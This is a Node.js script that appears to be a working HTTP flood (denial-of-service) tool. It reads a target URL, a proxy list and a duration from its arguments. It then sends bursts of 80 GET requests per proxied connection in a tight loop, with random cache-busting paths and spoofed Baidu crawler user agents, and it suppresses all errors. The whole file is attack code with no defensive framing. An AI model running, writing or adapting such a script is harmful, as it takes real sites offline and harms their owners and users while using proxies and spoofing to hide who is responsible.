process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');

var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
var tarPOST = process.argv[2];
var parsed = url.parse(tarPOST);

setTimeout(() => {
process.exit(1);
}, process.argv[4] * 1000);

const AllUA = [
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Baiduspider-image+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1C28 Safari/419.3"  
];

setInterval(function() {
    for(var random = ''; random.length < 5;) random += Math.random().toString(36).substr(2);
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(8000);
    for (let j = 0; j < 80; j++) {
    socket.write('GET ' + tarPOST + random +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + AllUA[Math.floor(Math.random() * AllUA.length)] + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n');
    }
	socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 8000);
    })
});
